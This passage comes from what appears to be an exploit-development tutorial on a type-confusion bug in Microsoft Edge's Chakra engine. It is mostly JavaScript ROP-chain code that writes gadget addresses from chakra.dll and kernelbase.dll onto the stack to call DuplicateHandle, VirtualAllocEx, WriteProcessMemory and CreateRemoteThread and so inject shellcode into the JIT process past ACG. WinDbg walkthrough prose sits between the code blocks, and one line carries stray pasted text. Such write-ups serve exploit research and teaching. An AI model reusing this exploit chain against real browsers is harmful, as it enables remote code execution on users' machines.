write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// SIZE_T dwSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPVOID lpAddress (RDX)
// Let VirtualAllocEx decide where the memory will be located
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     				   // Recall RAX already has a writable pointer in it

// Call KERNELBASE!VirtualAllocEx
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();is in its final state
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain
// Stage 3 -> Write our shellcode into the JIT process

// Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)

/*
0:015> dq kernelbase+0x216000+0x4000 L2
00007fff`58cfa000  00000000`00000000 00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     // Recall RAX already has a writable pointer in it

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);      // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// LPCVOID lpBuffer (R8) (shellcode in chakra.dll .data section)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);    	  // .data section of chakra.dll holding our shellcode
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
```

Our ROP chain starts with the following gadget:

```javascript
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
```

This gadget is also used four times before our first gadget within the `WriteProcessMemory` ROP chain. So, we will re-execute our updated exploit and set a breakpoint on this gadget and hit `g` in WinDbg five times in order to get to our intended first gadget (four times to "bypass" the other uses, and once more to get to our intended gadget).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion106.png" alt="">

Our first ROP sequence in our case is not going to actually involve `WriteProcessMemory`. Instead, we are going to store our `VirtualAllocEx` allocation (which should still be in RAX, as our previous ROP chain called `VirtualAllocEx`, which places the address of the allocation in RAX) in a "permanent" location within the `.data` section of `kernelbase.dll`. Think of this as we are storing the allocation returned from `VirtualAllocEx` in a "global variable" (of sorts):

```javascript
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();
```

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion107.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion108.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion109.png" alt="">

At this point we have achieved persistent storage of _where_ we would like to allocate our shellcode (the value returned from `VirtualAllocEx`). We will be using RAX in our ROP chain for `WriteProcessMemory`, so in this case we persistently store it so we do not "clobber" this value with our ROP chain. Having said that, our first item on the `WriteProcessMemory` docket is to place the size of our write operation (~ `sizeof(shellcode)`, of `0x1000` bytes) into R9 as the `nSize` argument.

We start this process, of which there are many examples in this blog post, by placing a writable address in RAX which we do not care about, to grant us access to the `mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret` gadget. This allows us to place our intended value of `0x1000` into R9.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion110.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion111.png" alt="">

Our call to `WriteProcessMemory` is now in the following state:

```c
WriteProcessMemory(
	-
	-
	-
	sizeof(shellcode)				// Size of our shellcode
	-
);
```

Next up in our ROP sequence is the `hProcess` parameter, also known as our `PROCESS_ALL_ACCESS` handle to the JIT server. We can simply just fetch this from the `.data` section of `chakra.dll`, where we stored this value as a result of our `DuplicateHandle` call.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion112.png" alt="">

You'll notice there is a `mov [rax+0x20], rcx` write operation that will write the contents of RCX into the memory address, at an offset of `0x20`, in RAX. You'll recall we "prepped" RAX already in this ROP sequence when dealing with the `nSize` parameter - meaning RAX already has a writable address, and the write operation will not cause an access violation (e.g. writing to a _non-writable_ address).

Our call to `WriteProcessMemory` is now in the following state:

```c
WriteProcessMemory(
	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	-
	-
	sizeof(shellcode)				// Size of our shellcode
	-
);
```

The next parameter we are going to deal with is `lpBaseAddress`. In our call to `WriteProcessMemory`, this is the address within the process denoted by the handle supplied in `hProcess` (the JIT server process where ACG is _disabled_). We control a region of one memory page within the JIT process, as a result of our `VirtualAllocEx` ROP chain. This allocation (which resides in the JIT process) is the address we are going to supply here.

This ROP sequence is _slightly_ convoluted, so I will provide the snippet (which is already above) directly below for continuity/context:

```javascript
// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();
```

We can simply `pop` the address where we stored the address of our JIT process allocation (via `VirtualAllocEx`) into the RDX register. However, this is where things get "interesting". There were no good gadgets within `chakra.dll` to _directly_ dereference RDX and place it into RDX (`mov rdx, [rdx] ; ret`). The only gadget to do so, as we see above, is `mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret`. We can see we are able to dereference RDX and store it in RDX, but not via RDX _directly_ instead, we have the ability to take whatever memory address is stored in RDX, at an offset of `0x8`, and place this into RDX. So, we do a bit of math here. If we `pop` our `jit_allocation-0x8` into RDX, when the `mov rdx, [rdx+0x8]` occurs, it will take the value in RDX, add `8` to it, and dereference the contents - storing them in RDX. Since `-0x8` + `+0x8` = 0, we simply "offset" the difference as a "hack", of sorts, to ensure RDX contains the base address of our allocation.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion113.png" alt="">

Our call to `WriteProcessMemory` is now in the following state:

```c
WriteProcessMemory(
	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	addressof(VirtualAllocEx_Allocation),		// Address of our return value from VirtualAllocEx (where we want to write our shellcode)
	-
	sizeof(shellcode)				// Size of our shellcode
	-
);
```

Now, our next item is to knock out the `lpBuffer` parameter. This is the easiest of our parameters, as we have already stored the shellcode we want to copy into the remote JIT process in the `.data` section of `chakra.dll` (see "Shellcode" section of this blog post).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion114.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion115.png" alt="">

Our call is now in the following state:

```c
WriteProcessMemory(
	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	addressof(VirtualAllocEx_Allocation),		// Address of our return value from VirtualAllocEx (where we want to write our shellcode)
	addressof(data_chakra_shellcode_location),	// Address of our shellcode in the content process (.data of chakra) (what we want to write (our shellcode))
	sizeof(shellcode)				// Size of our shellcode
	NULL 						// Optional
);
```

The last items on the agenda are to load `kernelbase!WriteProcessMemory` into RAX and `jmp` to it, and also write our last parameter to the stack at RSP + `0x28` (NULL/`0` value).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion116.png" alt="">

Now, before we hit the `jmp rax` instruction to jump into our call to `WriteProcessMemory`, let's attach _another_ WinDbg debugger to the JIT process and examine the `lpBaseAddress` parameter.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion117.png" alt="">

We can see our allocation is _valid_, but is not set to any value. Let's hit `t` in the content process WinDbg session and then `pt` to execute the call to `WriteProcessMemory`, but pausing before we return from the function call.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion118.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion119.png" alt="">

Now, let's go _back_ to the JIT process WinDbg session and re-examine the contents of the allocation.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion120.png" alt="">

As we can see, we have our shellcode mapped into the JIT process. All there is left now (which is a slight misnomer, as it is several more chained ROP chains) is to force the JIT process to mark this code as RWX, and execute it.

`CreateRemoteThread` ROP Chain
---

We now have a remote allocation within the JIT process, where we have written our shellcode to. As mentioned, we now need a way to execute this shellcode. As you may, or may not know, on Windows threads are what are responsible for executing code (not a process itself, which can be though of as a "container of resources"). What we are going to do now is create a thread within the JIT process, but we are going to create this thread in a _suspended_ manner. As we know, our shellcode is sitting in readable and writable page. We first need to mark this page as RWX, which we will do in the later portions of this blog. So, for now, we will create the thread which will be responsible for executing our shellcode in the future - but we are going to create it in a suspended state and reconcile execution later. `CreateRemoteThread` is an API, exported by the Windows API, which allows a user to create a thread in a _remote_ process. This will allow us to create a thread within the JIT process, from our current content process. Here is how our call will be setup:

```c
CreateRemoteThread(
	fulljitHandle,			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	NULL,				// Default SECURITY_ATTRIBUTES
	0,				// Default Stack size
	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
	NULL,				// No variable needs to be passed
	4,				// CREATE_SUSPENDED (Create the thread in a suspended state)
	NULL 				// Don't return the thread ID (we don't need it)
);
```

This call requires mostly everything to be set to `NULL` or `0`, with the exception of two parameters. We are creating our thread in a suspended state to ensure execution doesn't occur until we explicitly resume the thread. This is because we still need to overwrite the RSP register of this thread with our final-stage ROP chain, before the `ret` occurs. Since we are setting the `lpStartAddress` parameter to the address of a ROP gadget, this effectively is the entry point for this newly-created thread and it should be the function called. Since it is a ROP gadget that performs `ret`, execution should just return to the stack. So, when we eventually resume this thread, our thread (which is executing in he remote JIT process, where ACG is _disabled_), will return to whatever is located on the stack. We will eventually update RSP to point to.

Here is how this looks in ROP form (with all previous ROP chains added for context):

```javascript
// alert() for debugging
alert("DEBUG");

// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);

// Helper function to be called after each stack write to increment offset to be written to
function next()
{
    counter+=0x8;
}

// Begin ROP chain
// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

// DuplicateHandle() ROP chain
// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
// ACG is disabled in the JIT process
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

// HANDLE hSourceHandle (RDX)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
next();

// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPHANDLE lpTargetHandle (R9)
// This needs to be a writable address where the full JIT handle will be stored
// Using .data section of chakra.dll in a part where there is no data
/*
0:053> dqs chakra+0x72E000+0x20010
00007ffc`052ae010  00000000`00000000
00007ffc`052ae018  00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hSourceProcessHandle (RCX)
// Handle to the JIT process from the content process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
next();

// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();

// VirtuaAllocEx() ROP chain
// Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

// DWORD flAllocationType (R9)
// MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
/*
0:031> ? 0x00002000 | 0x00001000 
Evaluate expression: 12288 = 00000000`00003000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// SIZE_T dwSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPVOID lpAddress (RDX)
// Let VirtualAllocEx decide where the memory will be located
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
next();

